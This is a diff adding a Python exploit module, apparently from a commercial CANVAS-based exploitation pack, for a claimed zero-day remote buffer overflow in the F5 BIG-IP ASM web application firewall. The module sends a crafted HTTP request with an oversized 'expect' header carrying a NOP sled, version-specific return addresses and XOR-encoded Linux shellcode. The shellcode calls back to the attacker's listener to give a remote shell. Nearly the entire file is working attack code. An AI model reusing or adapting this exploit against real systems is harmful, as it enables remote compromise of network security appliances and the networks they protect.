@@ -1,0 +1,227 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys
+if '.' not in sys.path: sys.path.append('.')
+import canvasengine
+
+# CANVAS modules
+from exploitutils import *
+from tcpexploit import tcpexploit
+from MOSDEF import mosdef
+from shellcode import shellcodeGenerator, win32shell
+
+# ENCODER
+sys.path.append('../../encoder')
+sys.path.append('./encoder')
+import xorencoder
+
+# GUI info
+NAME = "F5 BIG-IP ASM Remote Buffer Overflow Vulnerability"
+
+DESCRIPTION = "[0day] Remote Buffer Overflow Vulnerability in F5 BIG-IP Web Application Firewall (ASM)"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "F5"
+DOCUMENTATION["Repeatability"] = "Close to infinite. If it gets stuck do it again until it crashes, as it will automaticlly restart. Crashing the ASM service, does not stop web traffic from being processed, simply from being protected by ASM."
+DOCUMENTATION["Date public"] = "[0day]"
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["Versions Affected"] = "All"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION='1.1'
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Remote'
+PROPERTY['ARCH'] = [['Linux']]
+PROPERTY['VERSION'] = ['1.1']
+
+NOTES = """
+"""
+
+CHANGELOG = """
+"""
+
+targets={
+	0: ['Autodetect (N/A)', 0],
+	1: ['9.4.4', 1],
+	2: ['9.4.5', 2],
+	3: ['9.4.6', 3],
+	4: ['9.4.7', 4]
+};
+
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.name=NAME
+		self.version=0
+		self.supportedNodeArgs=[['linuxNode']]
+		return
+
+	def broke(self, message):
+		if message:
+			self.log(message)
+		self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
+		exit()
+	
+	def connectTo(self, t_host, t_port):
+		s=self.gettcpsock()
+		try:
+			s.connect((t_host, t_port))
+		except:
+			self.broke("Failed to connect to %s,%d"%(t_host, t_port))
+		if self.ssl:
+			s=socket.ssl(s._sock)
+		return s
+
+	def run(self):
+		self.versionThings()
+		s = self.connectTo(self.host, self.port)
+		self.setInfo("%s running"%self.name)
+		self.pload = self.build_packet()
+
+		if self.ssl:
+			s.write(self.pload)
+		else:
+			s.send(self.pload)
+		s.close()
+		
+
+	def neededListenerTypes(self):
+		return [canvasengine.LINUXMOSDEF]
+
+	def versionThings(self):
+		self.log("Self.version number of " + str(self.version))
+		try:
+			self.port = self.argsDict["port"]
+		except:
+			self.broke("Failed to set self.port")
+		try:
+			self.host = self.target.interface
+		except:
+			self.broke("Failed to set self.version")
+		try:
+			self.url = self.argsDict["url"]
+		except:
+			self.url = "/"
+			self.log("Failed to retrieve url value, using '/'")
+		try:
+			self.ssl = self.argsDict["ssl"]
+			self.log("Using SSL")
+		except:
+			"Failed to retrieve ssl value, assuming false"
+			self.ssl = False
+		try:
+			self.version = self.argsDict["version"]
+		except:
+			self.broke("Did not retrieve version")
+		self.socknode = self.argsDict["passednodes"][0]
+			
+		self.version = int(self.version)
+		
+		if self.version==1: #9.4.4 and 9.2.3
+			self.lc = struct.pack('<L', 0x08d2CEc0)
+			self.lc_off = struct.pack('<L', 0xF0)
+			self.call_esp = struct.pack('<L', 0x081c374d)
+			self.distance_to_ret = 2124
+			self.dodgy = 'HHHH'
+		elif self.version==2: #9.4.5
+			self.lc = struct.pack('<L', 0x083c43e0)
+			self.lc_off = struct.pack('<L', 0xF0)
+			self.call_esp = struct.pack('<L', 0x083289df)
+			self.distance_to_ret = 2124
+			self.dodgy = ''
+		elif self.version==3: #9.4.6 
+			self.lc = struct.pack('<L', 0x083c5580)
+			self.lc_off = struct.pack('<L', 0xF0)  
+			self.call_esp = struct.pack('<L', 0x08102821)
+			self.distance_to_ret = 2128
+			self.dodgy = ''
+		elif self.version==5: #9.4.7
+			self.lc = struct.pack('<L', 0x083C6e60)
+			self.lc_off = struct.pack('<L', 0xF0)
+			self.call_esp = struct.pack('<L', 0x08106143)
+			self.distance_to_ret = 2128
+			self.dodgy = ''
+		else:
+			self.broke("bad version supplied %s"%self.version)			
+
+	def buildCodeThingies(self):
+		lc = self.lc
+		lc_off = self.lc_off
+		call_esp = self.call_esp
+		distance_to_ret = self.distance_to_ret
+
+		varz5 = 'AAAA' +   lc   + 'BBBB' + 'CCCC'
+		varz4 =   lc   + 'DDDD' + 'EEEE' + 'FFFF'
+		varz3 =   lc   +   lc   + 'GGGG' + self.dodgy
+		varz2 = 'IIII' + 'JJJJ' + 'KKKK' + 'LLLL'
+		varz1 = 'MMMM' + 'NNNN' + lc_off + 'OOOO'
+		varz0 = '{{{{' + 'PPPP' + 'QQQQ'
+		
+		self.varsled = varz5 + varz4 + varz3 + varz2 + varz1 + varz0 + 'RRRR' + call_esp
+		self.varsled += mosdef.assemble('jmp $-%d'%(100 + distance_to_ret),'x86') 
+
+		stackfix = """
+		subl $0xABCD,%esp
+		movl %esp,%ebp
+		"""
+		self.shellcode = mosdef.assemble(stackfix, "X86")
+
+		self.sc = shellcodeGenerator.linux_X86()
+		self.sc.addAttr('mmap_callback', {'host': self.callback.ip, 'port': self.callback.port, 'do_setuid': False, 'do_exit': False})
+		self.sc = self.sc.get()
+
+		self.log("checking for encoder")
+		
+		if '\r' in self.sc or '\n' in self.sc:
+			self.log("Needs to be encoded..")
+			encoder = xorencoder.simpleXOR()
+			encoder.setbadstring("\x0a")
+		        ret=encoder.find_key(self.sc)
+			if ret==0:
+				self.log("could not make shellcode, xor failure")
+				raise Exception, "No shellcode possible with xor. customize it?"
+			self.sc = encoder.encode(self.sc)
+			if self.sc == "":
+				raise Exception, "no shellcode generated?"
+		else:
+			self.log("no encoder needed")
+		
+		self.shellcode += self.sc
+		return self.shellcode
+		
+	def make_sled(self, size, pre='', shellcode='', nop='\x90'):
+		sc_len = len(shellcode)
+		pre_len = len(pre)
+		if sc_len + pre_len > size:
+			self.broke("Shellcode exceeds size")
+
+		sled_len = size - sc_len - pre_len
+		totality = pre + (nop * size)[:sled_len] + shellcode
+		return totality
+		
+	def build_packet(self):
+		packet = 'GET ' + self.url + ' HTTP/1.1\r\nexpect: '
+		packet += self.make_sled(self.distance_to_ret, shellcode=self.buildCodeThingies())
+		packet += self.varsled + '\r\n\r\n\r\n\r\n'
+		return packet
+
+if __name__=="__main__":
+	kgh = theexploit()
+	ret = standard_callback_commandline(kgh)
+
+	
